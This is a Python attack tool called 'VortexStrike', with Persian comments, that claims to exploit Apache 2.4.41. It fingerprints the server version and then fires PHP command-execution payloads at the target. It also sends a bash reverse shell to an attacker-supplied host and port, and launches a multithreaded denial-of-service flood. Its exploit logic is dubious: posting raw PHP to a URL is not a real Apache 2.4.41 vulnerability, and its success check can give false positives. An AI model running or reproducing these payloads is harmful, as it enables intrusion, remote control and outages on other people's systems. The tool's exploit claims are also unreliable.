import requests
import sys
import threading
import argparse

# رنگ‌ها
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# بررسی نسخه Apache
def get_apache_version(url):
    try:
        response = requests.get(url, timeout=5)

        # جستجو در هدر 'Server'
        if 'Server' in response.headers:
            server_header = response.headers['Server']
            if 'Apache' in server_header:
                print(f"{Colors.OKGREEN}[+] Apache version detected in 'Server' header: {server_header}{Colors.ENDC}")
                if "2.4.41" in server_header:
                    return "Apache/2.4.41"
            else:
                print(f"{Colors.FAIL}[-] Apache server not detected in 'Server' header.{Colors.ENDC}")

        # جستجو در هدر 'X-Powered-By'
        if 'X-Powered-By' in response.headers:
            powered_by_header = response.headers['X-Powered-By']
            if 'Apache' in powered_by_header:
                print(f"{Colors.OKGREEN}[+] Apache detected in 'X-Powered-By' header: {powered_by_header}{Colors.ENDC}")
                if "2.4.41" in powered_by_header:
                    return "Apache/2.4.41"
            else:
                print(f"{Colors.FAIL}[-] Apache server not detected in 'X-Powered-By' header.{Colors.ENDC}")

        # جستجوی نسخه Apache در متن پاسخ HTML
        if "Apache/2.4.41" in response.text:
            print(f"{Colors.OKGREEN}[+] Apache version detected in response body: Apache/2.4.41{Colors.ENDC}")
            return "Apache/2.4.41"
        else:
            print(f"{Colors.WARNING}[-] Apache version not found in response body.{Colors.ENDC}")

    except requests.exceptions.RequestException as e:
        print(f"{Colors.FAIL}Error: {e}{Colors.ENDC}")

    return None

# اکسپلویت RCE
def exploit_rce(url, command="id"):
    print(f"{Colors.OKCYAN}[+] Trying RCE exploit with command: {command}{Colors.ENDC}")
    
    payloads = [
        f"<?php system('{command}'); ?>",
        f"<?php echo shell_exec('{command}'); ?>",
        f"<?php exec('{command}'); ?>",
        f"<?php passthru('{command}'); ?>",
        f"<?php eval(`{command}`); ?>",
        f"<?php pclose(popen('{command}', 'r')); ?>",
    ]
    
    for payload in payloads:
        print(f"{Colors.OKBLUE}[*] Trying payload: {payload}{Colors.ENDC}")
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=5)
            if command in response.text:
                print(f"{Colors.OKGREEN}[+] RCE successful! Output: {response.text.strip()}{Colors.ENDC}")
                return
            else:
                print(f"{Colors.FAIL}[-] RCE failed with this payload.{Colors.ENDC}")
        except requests.exceptions.RequestException as e:
            print(f"{Colors.FAIL}Error during RCE: {e}{Colors.ENDC}")
            return  

    print(f"{Colors.FAIL}[-] All RCE payloads failed.{Colors.ENDC}")

# اکسپلویت شل معکوس
def exploit_rce_reverse_shell(url, lhost, lport):
    print(f"{Colors.OKCYAN}[+] Trying reverse shell via RCE...{Colors.ENDC}")
    
    payload = f"<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"'); ?>"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=5)
        if response.status_code == 200:
            print(f"{Colors.OKGREEN}[+] Reverse shell payload sent. Check your listener!{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[-] Failed to send reverse shell payload.{Colors.ENDC}")
    except requests.exceptions.RequestException as e:
        print(f"{Colors.FAIL}Error during reverse shell RCE: {e}{Colors.ENDC}")

# حمله DoS
def dos_attack(url, num_requests):
    print(f"{Colors.OKCYAN}[+] Starting DoS attack with {num_requests} requests...{Colors.ENDC}")
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    payload = 'A' * 10000  

    def send_request():
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=5)
            print(f"{Colors.OKBLUE}[*] DoS attack request sent! Status Code: {response.status_code}{Colors.ENDC}")
        except requests.exceptions.RequestException as e:
            print(f"{Colors.FAIL}Error during DoS attack: {e}{Colors.ENDC}")

    threads = []
    
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# اجرای اکسپلویت‌ها
def run_exploits(url, rce_command=None, rce_reverse=False, lhost=None, lport=None, dos=False, num_requests=1):
    version = get_apache_version(url)
    
    if version and "Apache/2.4.41" in version:
        print(f"{Colors.OKGREEN}[+] Vulnerable Apache version detected: 2.4.41{Colors.ENDC}")
        
        if dos:
            dos_attack(url, num_requests)
        
        if rce_reverse and lhost and lport:
            exploit_rce_reverse_shell(url, lhost, lport)
        elif rce_command:
            exploit_rce(url, rce_command)
        else:
            print(f"{Colors.FAIL}[-] No RCE command or reverse shell provided.{Colors.ENDC}")
    else:
        print(f"{Colors.FAIL}[-] Apache 2.4.41 not detected or not vulnerable.{Colors.ENDC}")

# نمایش help
def display_help():
    print(f"""
    {Colors.BOLD}Usage:{Colors.ENDC}
        python3 VortexStrike.py --url <target_url> [--rce-command <command>] [--reverse-shell <lhost> <lport>] [--dos <num_requests>]
    
    {Colors.BOLD}Options:{Colors.ENDC}
        --url           Target URL to test.
        --rce-command   Command to execute via RCE.
        --reverse-shell Enable reverse shell with specified lhost and lport.
        --dos           Launch DoS attack with specified number of requests.
    
    {Colors.BOLD}Examples:{Colors.ENDC}
        python3 VortexStrike.py --url http://target-site.com --rce-command "whoami"
        python3 VortexStrike.py --url http://target-site.com --reverse-shell 192.168.1.100 4444
        python3 VortexStrike.py --url http://target-site.com --dos 10
    """)

# پارس کردن ورودی‌های خط فرمان
def parse_args():
    parser = argparse.ArgumentParser(description="Apache 2.4.41 Exploitation Tool - VortexStrike")
    parser.add_argument('--url', required=True, help='Target URL')
    parser.add_argument('--rce-command', help='Command to execute via RCE')
    parser.add_argument('--reverse-shell', nargs=2, metavar=('LHOST', 'LPORT'), help='Enable reverse shell with lhost and lport')
    parser.add_argument('--dos', type=int, help='Launch DoS attack with specified number of requests')

    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()

    if not args.url:
        display_help()
        sys.exit(1)

    if args.reverse_shell:
        run_exploits(args.url, rce_reverse=True, lhost=args.reverse_shell[0], lport=args.reverse_shell[1], dos=args.dos is not None, num_requests=args.dos if args.dos else 1)
    elif args.rce_command:
        run_exploits(args.url, rce_command=args.rce_command, dos=args.dos is not None, num_requests=args.dos if args.dos else 1)
    elif args.dos:
        run_exploits(args.url, dos=True, num_requests=args.dos)
    else:
        display_help()
